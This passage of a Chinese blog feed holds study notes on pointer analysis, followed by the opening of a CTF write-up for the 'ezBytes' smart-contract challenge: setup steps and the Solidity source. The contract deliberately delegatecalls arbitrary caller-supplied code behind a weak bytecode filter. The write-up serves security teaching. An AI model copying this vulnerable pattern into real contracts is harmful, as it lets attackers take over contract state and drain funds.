y指向的加入x的集合</li><li>Store x指向oi，y指向oj，同时把y存到x.f里，就把oj指到oi.f</li><li>Load x指向oi，把x.f赋值给y，且oi.f指向oj，就把y指到oj</li></ul><h2 id="implement"><a href="#implement" class="headerlink" title="implement"></a>implement</h2><p>主要部分：在指针之间互相传播</p><h4 id="关键：当一个指针集合变化、更新时，要把变化的部分传播给与它相关的其他指针"><a href="#关键：当一个指针集合变化、更新时，要把变化的部分传播给与它相关的其他指针" class="headerlink" title="关键：当一个指针集合变化、更新时，要把变化的部分传播给与它相关的其他指针"></a>关键：当一个指针集合变化、更新时，要把变化的部分传播给与它相关的其他指针</h4><h3 id="PFG-指针流图"><a href="#PFG-指针流图" class="headerlink" title="PFG 指针流图"></a>PFG 指针流图</h3><p>有向图</p><p>节点：程序中的指针</p><p>边：指针指向的对象在指针间的流动</p><h3 id="PFG建边"><a href="#PFG建边" class="headerlink" title="PFG建边"></a>PFG建边</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337834.png"                      alt="image-20231029172931068"                ><figcaption>image-20231029172931068</figcaption></figure></p><ul><li>premises   c-&gt;oi  d-&gt;oi</li><li>a&#x3D;b   a&lt;-b</li><li>c.f&#x3D;a    oi.f&lt;-a  </li><li>d&#x3D;c   d&lt;-c</li><li>c.f&#x3D;d   d-&gt;oi.f</li><li>e&#x3D;d.f  oi.f-&gt;e</li></ul><blockquote><p>一个边只表示一步的的传播</p><p>指针分析要在图上找传递闭包</p></blockquote><h3 id="algorithm–只有new和assign的情况"><a href="#algorithm–只有new和assign的情况" class="headerlink" title="algorithm–只有new和assign的情况"></a>algorithm–只有new和assign的情况</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222337351.png"                      alt="image-20231029174120726"                ><figcaption>image-20231029174120726</figcaption></figure></p><h4 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h4><ul><li>WL：待处理的项<ul><li>相当于pair的List，&lt;pointer,P(O)&gt;,前面是指针，后面是指某个集合</li></ul></li><li>PFG：算法中表示成了边的集合</li><li>S输入的语句</li></ul><h4 id="左边的主算法"><a href="#左边的主算法" class="headerlink" title="左边的主算法"></a>左边的主算法</h4><ul><li><p>首先处理new语句，直接加到WL里面</p></li><li><p>再处理assign语句，相当于往PFG里加边</p><ul><li>加边是需要注意更新workList</li><li>更新的规则，比如新增边是s-&gt;t，如果s指向的集合pt（s）不为空，则要在worklist里面加上，&lt;t,Pt(s)&gt;  （s指向的对象会流向t指针）</li></ul></li><li><p>对WL的处理</p><ul><li><p>每次取一个pair ，取出&lt;n,pts&gt;，先删除pts集合中与n指针指向的集合重复的元素，把得到的集合传到propgate函数中，同时还要把n指针传进去</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222338428.png"                      alt="image-20231029175417544"                ><figcaption>image-20231029175417544</figcaption></figure></p></li><li><p>prpgate函数：首先拓展n指针指向的集合，再把n的所有后继找出来，把pts加入他们指向的集合（先）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222338173.png"                      alt="image-20231029175627084"                ><figcaption>image-20231029175627084</figcaption></figure></p></li></ul></li></ul><blockquote><p>添加了计算差集的原因：差集是真正要传播的，这样做可以避免冗余操作</p></blockquote><h3 id="algorithm–store和load的情况"><a href="#algorithm–store和load的情况" class="headerlink" title="algorithm–store和load的情况"></a>algorithm–store和load的情况</h3><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222338341.png"                      alt="image-20231030195356238" style="zoom:50%;"                 ><figcaption>image-20231030195356238</figcaption></figure><ul><li>store<ul><li>AddEdge</li><li>x.f&#x3D;y  oi.f&lt;-y</li><li>红框的部分不一定会在PFG里面加入新的边<ul><li>虽然因为x.f&#x3D;y要加入oi.f &lt;- y这条边，但可能之前有另一个变量a也指向oi，所以oi.f &lt;- y可能之前就加过了</li></ul></li></ul></li><li>load<ul><li>AddEdge</li><li>y&#x3D;x.f  y&lt;-oi.f</li><li>也有上面说的问题</li></ul></li></ul><h3 id="algorithm–总体"><a href="#algorithm–总体" class="headerlink" title="algorithm–总体"></a>algorithm–总体</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222338789.png"                      alt="image-20231030200607462"                ><figcaption>image-20231030200607462</figcaption></figure></p><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 b = new C();</span><br><span class="line">2 a = b;</span><br><span class="line">3 c = new C();</span><br><span class="line">4 c.f = a;</span><br><span class="line">5 d = c;</span><br><span class="line">6 c.f = d;</span><br><span class="line">7 e = d.f;</span><br></pre></td></tr></table></figure></div><blockquote><p>oi表示是第i个语句中的对象</p></blockquote><ol><li>先处理new语句<ul><li>b&#x3D;new C   &lt;b,{o1}&gt;</li><li>c&#x3D;new C   &lt;c,{o3}&gt;</li><li>上面两个都加到WL里面去</li></ul></li><li>处理Assign语句<ul><li>a&#x3D;b a{}&lt;-b{}</li><li>d&#x3D;c d{}&lt;-c{}</li></ul></li><li>处理WL（需要看成是队列，先进先出）<ul><li>处理&lt;b,{o1}&gt;  a{}&lt;-b{o1} &lt;a,{o1}&gt;加入WL</li><li>处理&lt;c,{o3}&gt;  d{}&lt;-c{o3} &lt;d,{o3}&gt;加入WL<ul><li>由于存在c.f，要继续处理load&#x2F;store c.f&#x3D;a  c.f&#x3D;d</li><li>加边 o3.f{}&lt;-a{}   o3.f{}&lt;-d{}</li></ul></li><li>处理&lt;a,{o1}&gt;  &lt;o3.f,{o1}&gt;加入WL</li><li>处理&lt;d,{o3}&gt;  &lt;o3.f,{o3}&gt;加入WL<ul><li>d变量存在load  e&#x3D;d.f  加边o3.f-&gt;e</li></ul></li><li>处理&lt;o3.f,{o1}&gt;  &lt;e,{o1}&gt;也加入WL</li><li>处理&lt;o3.f,{o3}&gt;  &lt;e,{o3}&gt;也加入WL</li><li>处理&lt;e,{o1}&gt; 直接改集合</li><li>处理&lt;e,{o3}&gt; 直接改集合</li></ul></li></ol><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222338856.png"                      alt="image-20231030202638246" style="zoom:50%;"                 ><figcaption>image-20231030202638246</figcaption></figure><h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><p>针对的是在那些方法中的变量，由于方法在不同地方调用不同，同时传入的参数也不同，这使得处理方法调用比较麻烦</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222339449.png"                      alt="image-20231030203317349" style="zoom:50%;"                 ><figcaption>image-20231030203317349</figcaption></figure><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339433.png"                      alt="image-20231031101934668"                ><figcaption>image-20231031101934668</figcaption></figure></p><ol><li><p>dispatch找到真正调用的方法</p><ul><li>和CHA的类似</li><li>找到目标方法，存到变量m里</li></ul></li><li><p>传receiver object （调用方法的对象）</p><ul><li><p>虚线，但是x到this指针不是直接建立pfg中的边</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222339692.png"                      alt="image-20231031101710618" style="zoom:33%;"                 ><figcaption>image-20231031101710618</figcaption></figure></li><li><p>因为x可能指向多个对象，下图这种情况，如果直接建立x-&gt;this,会导致三个类的this都指向ABC（明显各类中通过dispatch找foo方法时，this只会是本身）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339402.png"                      alt="image-20231031102313325"                ><figcaption>image-20231031102313325</figcaption></figure></p></li><li><p>解决方法：特殊处理，只传该传的</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339227.png"                      alt="image-20231031102959408"                ><figcaption>image-20231031102959408</figcaption></figure></p></li></ul></li><li><p>传参数</p><ul><li>m是形参，a是实参</li><li>把实参和形参连起来(PFG中)</li></ul></li><li><p>传返回值</p><ul><li>函数中的ret传到外面的r变量中</li></ul></li></ol><h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><p>分析可达方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339317.png"                      alt="image-20231031103610480"                ><figcaption>image-20231031103610480</figcaption></figure></p><blockquote><p>输入为程序的entry方法，可以理解为main方法</p><p>S为可达语句的集合</p><p>RM为可达方法集合</p><p>CG call graph的边</p></blockquote><h3 id="algorithm–AddReachable"><a href="#algorithm–AddReachable" class="headerlink" title="algorithm–AddReachable"></a>algorithm–AddReachable</h3><ol><li>首先把传入的方法m加入RM集合（先判断m在不在RM中），m所在语句Sm也加入S集合中</li><li>处理new语句，加入WL</li><li>处理assign语句，调用addEdge</li></ol><blockquote><p>因为方法是新加进来的，指针集都是空的，还没办法做load和store （在后面的大循环中会被处理）</p></blockquote><h3 id="algorithm–ProcessCall"><a href="#algorithm–ProcessCall" class="headerlink" title="algorithm–ProcessCall"></a>algorithm–ProcessCall</h3><p>传入参数为x和oi</p><p>处理每条方法调用语句 l: r&#x3D;x.k(a1,…,an)</p><ol><li>通过dispatch定位到真正的方法m</li><li>&lt;m_this,{oi}&gt;加到WL</li><li>如果l-&gt;m不在call graph中，则加入<ul><li>之后继续处理参数，实参指向形参</li><li>传返回值</li></ul></li></ol><h2 id="上下文敏感指针分析"><a href="#上下文敏感指针分析" class="headerlink" title="上下文敏感指针分析"></a>上下文敏感指针分析</h2><h3 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h3><p>使用上下文不敏感指针分析，分析出来i时1</p><p>根据常量传播，分析出来是NAC</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339039.png"                      alt="image-20231031144945307"                ><figcaption>image-20231031144945307</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222340568.png"                      alt="image-20231031145340357"                ><figcaption>image-20231031145340357</figcaption></figure></p><p>上下文敏感，方法调用时分开分析</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340741.png"                      alt="image-20231031145454890" style="zoom: 50%;"                 ><figcaption>image-20231031145454890</figcaption></figure><h3 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h3><p>给每个方法加以上下文修饰</p><p>以上面的程序为例，id有两个上下文，给id克隆两份</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340777.png"                      alt="image-20231031190623874" style="zoom:50%;"                 ><figcaption>image-20231031190623874</figcaption></figure><h3 id="上下文敏感的Heap"><a href="#上下文敏感的Heap" class="headerlink" title="上下文敏感的Heap"></a>上下文敏感的Heap</h3><p>上下文敏感还要加在堆抽象中，得到更细粒度的堆抽象</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222340035.png"                      alt="image-20231031190855453"                ><figcaption>image-20231031190855453</figcaption></figure></p><p>不同上下文创建的X，里面的field不一定一样</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340066.png"                      alt="image-20231031191041314" style="zoom:33%;"                 ><figcaption>image-20231031191041314</figcaption></figure><h3 id="Heap–an-example"><a href="#Heap–an-example" class="headerlink" title="Heap–an example"></a>Heap–an example</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  n1 = <span class="keyword">new</span> <span class="title class_">One</span>();</span><br><span class="line"><span class="number">2</span>  n2 = <span class="keyword">new</span> <span class="title class_">Two</span>();</span><br><span class="line"><span class="number">3</span>  x1 = newX(n1);</span><br><span class="line"><span class="number">4</span>  x2 = newX(n2);</span><br><span class="line"><span class="number">5</span>  n = x1.f;<span class="comment">// n动态执行时指向n1</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span> X <span class="title function_">newX</span><span class="params">(Number p)</span> &#123; </span><br><span class="line"><span class="number">8</span> Xx=newX();</span><br><span class="line"><span class="number">9</span> x.f=p;</span><br><span class="line"><span class="number">10</span> <span class="keyword">return</span> x;</span><br><span class="line"><span class="number">11</span> &#125;</span><br><span class="line"><span class="number">12</span> <span class="keyword">class</span> <span class="title class_">X</span> &#123;</span><br><span class="line"><span class="number">13</span>    Number f;</span><br><span class="line"><span class="number">14</span> &#125;</span><br></pre></td></tr></table></figure></div><h4 id="对上面这段程序做指针分析-此时Heap上下文不敏感"><a href="#对上面这段程序做指针分析-此时Heap上下文不敏感" class="headerlink" title="对上面这段程序做指针分析,此时Heap上下文不敏感"></a>对上面这段程序做指针分析,此时Heap上下文不敏感</h4><ol><li>先分析1、2， heap中<code>&lt;n1,o1&gt; &lt;n2,o2&gt;</code></li><li>再分析3、7, <code>&lt;3:p,o1&gt;</code></li><li>分析8 <code>&lt;3:x,o8&gt;</code></li><li>9、10 <code>&lt;o8.f,o1&gt; &lt;x1,3:o8&gt;</code> &#96;</li><li>4、7、8 <code>&lt;4:p,o2&gt; &lt;4:x,o8&gt;</code> </li><li>9 <code>&lt;o8.f,&#123;o1,o2&#125;&gt;</code></li><li>5 <code>&lt;n,&#123;o1,o2&#125;&gt;</code></li></ol><h4 id="Heap上下文敏感分析"><a href="#Heap上下文敏感分析" class="headerlink" title="Heap上下文敏感分析"></a>Heap上下文敏感分析</h4><ol><li>1、2、3 <code>&lt;n1,o1&gt; &lt;n2,o2&gt; &lt;3:p,o1&gt;</code> </li><li>8 <code>&lt;3:x,3:o8&gt;</code></li><li>9、10 <code>&lt;3:o8.f,o1&gt; &lt;x1,3:o8&gt;</code>  </li><li>4、7、8 <code>&lt;4:p,o2&gt; &lt;4:x,4:o8&gt;</code> </li><li>9、10 <code>&lt;4:o8.f,o2&gt; &lt;x2:4:o8&gt;</code></li><li>5 <code>&lt;n,o1&gt;</code></li></ol><h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><p>提升了指针分析的精度</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340621.png"                      alt="image-20231031193052049" style="zoom:50%;"                 ><figcaption>image-20231031193052049</figcaption></figure><h4 id="上下文敏感Heap，变量上下文不敏感"><a href="#上下文敏感Heap，变量上下文不敏感" class="headerlink" title="上下文敏感Heap，变量上下文不敏感"></a>上下文敏感Heap，变量上下文不敏感</h4><p>说明二者缺一不可</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340871.png"                      alt="image-20231031193242899" style="zoom:50%;"                 ><figcaption>image-20231031193242899</figcaption></figure><h3 id="相关符号"><a href="#相关符号" class="headerlink" title="相关符号"></a>相关符号</h3><p>用c、c’、c’’表示不同上下文</p><p>CSPointer上下文敏感的指针</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340782.png"                      alt="image-20231031193939250" style="zoom: 33%;"                 ><figcaption>image-20231031193939250</figcaption></figure><h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><ul><li><p>new语句 i: x &#x3D; new T();  c:oi&lt;-c:x</p></li><li><p>assign语句 x&#x3D;y  已知 c:y-&gt; c’:oi 则 c:x-&gt;c’:oi</p></li><li><p>store 已知x.f&#x3D;y  c:x.f-&gt;c’:oi y-&gt;c’’:oj 则c’:oi.f-&gt;c’’:oj</p><ul><li>c’和c’’可能是同一个，也可能不是同一个上下文</li></ul></li><li><p>load 已知y&#x3D;x.f c:x.f-&gt;c’:oi c’:oi.f-&gt;c’’:oj 则c:y-&gt;c’’:oj </p></li><li><p>call  l: r &#x3D; x</p><ul><li><p>c:x-&gt;c’:oi </p></li><li><p>找目标方法，dispatch，然后根据调用点的信息算出来一个上下文c^t&#x3D;Select(c,l,c’:oi,m)</p><ul><li><p>相当于克隆，每遇到一个新的调用点，就会新增一个callee context</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222341305.png"                      alt="image-20231031201855315" style="zoom: 33%;"                 ><figcaption>image-20231031201855315</figcaption></figure></li></ul></li><li><p>实参和形参的对应</p></li><li><p>传return值，返回值的上下文是上面选出来的c^t</p></li></ul></li></ul><h3 id="带有上下文信息的PFG"><a href="#带有上下文信息的PFG" class="headerlink" title="带有上下文信息的PFG"></a>带有上下文信息的PFG</h3><p>node:CSPointer</p><p>edges:CSPointer x CSPoniter</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222341127.png"                      alt="image-20231031203607920"                ><figcaption>image-20231031203607920</figcaption></figure></p><h4 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222341973.png"                      alt="image-20231031203724602"                ><figcaption>image-20231031203724602</figcaption></figure></p><h3 id="上下文敏感指针分析算法"><a href="#上下文敏感指针分析算法" class="headerlink" title="上下文敏感指针分析算法"></a>上下文敏感指针分析算法</h3><p>主题框架和上下文不敏感指针分析算法一致</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222341369.png"                      alt="image-20231031212845276"                ><figcaption>image-20231031212845276</figcaption></figure></p><ul><li>首先给入口函数的上下文为[]</li><li>entry方法加入可达方法<ul><li>同时处理new和assign语句，更新WL</li></ul></li><li>处理WL<ul><li>更新WL中pair里指针对应的集合</li><li>如果指针是变量，则继续处理load和store</li><li>重点：ProcessCall，多了一个select</li></ul></li></ul><h3 id="上下文敏感技术"><a href="#上下文敏感技术" class="headerlink" title="上下文敏感技术"></a>上下文敏感技术</h3><ul><li>调用敏感 k-CFA</li><li>类型敏感</li><li>对象敏感</li></ul>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
            <tag> pointer analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezBytes-出题记录/wp</title>
      <link href="/2023/10/02/ezBytes-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/"/>
      <url>/2023/10/02/ezBytes-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ezBytes"><a href="#ezBytes" class="headerlink" title="ezBytes"></a>ezBytes</h1><h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>校赛出的一道智能合约的wp，记录一下</p><h2 id="0x01-环境基本配置"><a href="#0x01-环境基本配置" class="headerlink" title="0x01 环境基本配置"></a>0x01 环境基本配置</h2><h3 id="钱包连接私链"><a href="#钱包连接私链" class="headerlink" title="钱包连接私链"></a>钱包连接私链</h3><p>首先需要准备一个metamask(一个钱包软件，浏览器插件)，随意注册一个账号即可（网上教程很多，这里不赘述，可以参考<a class="link"   href="https://www.bilibili.com/video/BV1Ca411n7ta?p=7&vd_source=5ec02b685bc73487523c9c6794fde5c4" >https://www.bilibili.com/video/BV1Ca411n7ta?p=7&amp;vd_source=5ec02b685bc73487523c9c6794fde5c4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> p7）</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290242540.png"                      alt="image-20231128202757837" style="zoom:50%;"                 ><figcaption>image-20231128202757837</figcaption></figure><p>新建网络，加入题目的rpc(私链),chain ID会自动识别(图中报错高速chain id是23896，更改即可)，货币符号填写ETH</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290242433.png"                      alt="image-20231128203720784" style="zoom:33%;"                 ><figcaption>image-20231128203720784</figcaption></figure><h3 id="查看私钥"><a href="#查看私钥" class="headerlink" title="查看私钥"></a>查看私钥</h3><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290242383.png"                      alt="image-20231128205729043" style="zoom:33%;"                 ><figcaption>image-20231128205729043</figcaption></figure><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290241553.png"                      alt="image-20231128205751032" style="zoom:33%;"                 ><figcaption>image-20231128205751032</figcaption></figure><p>之后输入密码即可获取账户的私钥</p><h3 id="faucet-水龙头-获取测试币"><a href="#faucet-水龙头-获取测试币" class="headerlink" title="faucet(水龙头)获取测试币"></a>faucet(水龙头)获取测试币</h3><p>只需要把公钥输入即可获取1ETH（cd 1分钟）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241777.png"                      alt="image-20231128205414832"                ><figcaption>image-20231128205414832</figcaption></figure></p><h3 id="题目合约部署"><a href="#题目合约部署" class="headerlink" title="题目合约部署"></a>题目合约部署</h3><p>首先访问题目创建一个deployer账户，注意：只能知道该用户的公钥，不知道私钥，而最后部署solver合约时需要账户的私钥，因此需要用到上面那个用metamask钱包软件创建的用户。</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241215.png"                      alt="image-20231128205847508"                ><figcaption>image-20231128205847508</figcaption></figure></p><blockquote><p>token也需要保存，题目后面会用来部署题目合约，同时这里最后提示了需要向deployer用户转1.002测试币以部署合约</p></blockquote><p>先用水龙头向deployer用户转2个测试币（可以给自己用metamask创的号也转2个测试币），接下来就可以选择2进行challenge合约的部署了</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241306.png"                      alt="image-20231128210457365"                ><figcaption>image-20231128210457365</figcaption></figure></p><blockquote><p>可以看到成功部署了合约，合约地址为0xee7Cc887214b782563D9E4D42A124684e20E15bd</p><p>题目也提示了需要让isSloved()返回true</p></blockquote><h3 id="Remix-IDE在线部署题目合约"><a href="#Remix-IDE在线部署题目合约" class="headerlink" title="Remix IDE在线部署题目合约"></a>Remix IDE在线部署题目合约</h3><p>访问选项4可以获取合约的源码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.2;</span><br><span class="line">contract ezBytes&#123;</span><br><span class="line">    address public  i_owner;</span><br><span class="line">    bytes32 private  password=&quot;jnctf2023&quot;;</span><br><span class="line">    constructor() payable  public&#123;</span><br><span class="line">        i_owner = msg.sender;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        if(msg.sender != i_owner) &#123; require(false); &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function challenge(address _yourContractAdd) public payable&#123;</span><br><span class="line"></span><br><span class="line">        uint256 size;</span><br><span class="line">        bytes memory your_code;</span><br><span class="line"></span><br><span class="line">        assembly&#123;</span><br><span class="line">            size := extcodesize(_yourContractAdd)</span><br><span class="line">            your_code := mload(0x40)</span><br><span class="line">            mstore(0x40, add(your_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line">            mstore(your_code, size)</span><br><span class="line">            extcodecopy(_yourContractAdd, add(your_code, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line">        for(uint256 i = 0; i &lt; your_code.length; i++) &#123;</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success, ) = _yourContractAdd.delegatecall(&quot;&quot;);</span><br><span class="line">        require(success,&quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function check() public view returns(bool)&#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function changePassword(bytes32 str)onlyOwner payable public&#123;</span><br><span class="line">        password=str;</span><br><span class="line">    &#125;</span><br><span class="line">    function checkPassword() public view returns (bool)&#123;</span><br><span class="line">        return password==&quot;22222222222222&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool flag1=check();</span><br><span class="line">        require(flag1,&quot;Oops, there is still a balance in the contract account.&quot;);</span><br><span class="line">        bool flag2=checkPassword();</span><br><span class="line">        require(flag2,&quot;Password is wrong.&quot;);</span><br><span class="line">        return flag1&amp;&amp;flag2 ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>打开在线IDE Remix <a class="link"   href="https://remix.ethereum.org/" >https://remix.ethereum.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (需要科学上网🧐💡)新建一个ezBytes.sol文件,编译选项页面记得选择编译器版本为源码开头标识的0.7.2, 编译成功后即可部署</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241998.png"                      alt="image-20231128210842347"                ><figcaption>image-20231128210842347</figcaption></figure></p><p>切换到部署界面，选择环境为metamask，这样才能访问到私链上的合约，在At Address处写下刚才获取的challenge合约地址0xee7Cc887214b782563D9E4D42A124684e20E15bd</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241787.png"                      alt="image-20231128211753657"                ><figcaption>image-20231128211753657</figcaption></figure></p><p>点击“At Address”即可得到challenge合约</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290241096.png"                      alt="image-20231128211834506" style="zoom: 50%;"                 ><figcaption>image-20231128211834506</figcaption></figure><h2 id="0x02-合约分析"><a href="#0x02-合约分析" class="headerlink" title="0x02 合约分析"></a>0x02 合约分析</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.2;</span><br><span class="line">contract ezBytes&#123;</span><br><span class="line">    address public  i_owner;</span><br><span class="line">    bytes32 private  password=&quot;jnctf2023&quot;;</span><br><span class="line">    constructor() payable  public&#123;</span><br><span class="line">        i_owner = msg.sender;//初始化i_owner，由于合约构造函数执行的那个交易是deployer账号发起的，因此i_owner就对标了合约所有者</span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner &#123;//被onlyOwner修饰的函数只有合约所有者才能执行</span><br><span class="line">        